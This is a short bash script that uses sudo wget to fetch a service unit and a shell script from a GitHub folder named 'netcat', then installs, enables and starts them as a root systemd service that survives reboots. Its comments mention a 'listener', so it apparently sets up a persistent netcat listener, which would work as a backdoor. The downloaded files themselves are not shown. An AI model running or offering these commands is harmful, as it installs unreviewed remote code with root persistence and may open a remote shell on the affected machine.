#!/bin/bash

cd /var

sudo wget https://raw.githubusercontent.com/thetechguy44/Linux-commands/main/netcat/baby.service
sudo wget https://raw.githubusercontent.com/thetechguy44/Linux-commands/main/netcat/auto-run.sh

sudo chmod +x auto-run.sh
# sudo chmod +x baby.service

# this will start our file both on reboot and start-up

# Create a systemd service unit:

# Create a file, for example, /etc/systemd/system/restart_listener.service, and add the following content:
sudo mv baby.service /etc/systemd/system/baby.service

# to always restart script
# sudo nohup ./auto-run.sh > /dev/null 2>&1 &

# Replace /home/ubuntu/script.sh with the actual path to your script.

# Enable and start the service:
sudo systemctl enable baby.service
sudo systemctl start baby.service

# sudo wget https://raw.githubusercontent.com/thetechguy44/Linux-commands/main/netcat/script.sh
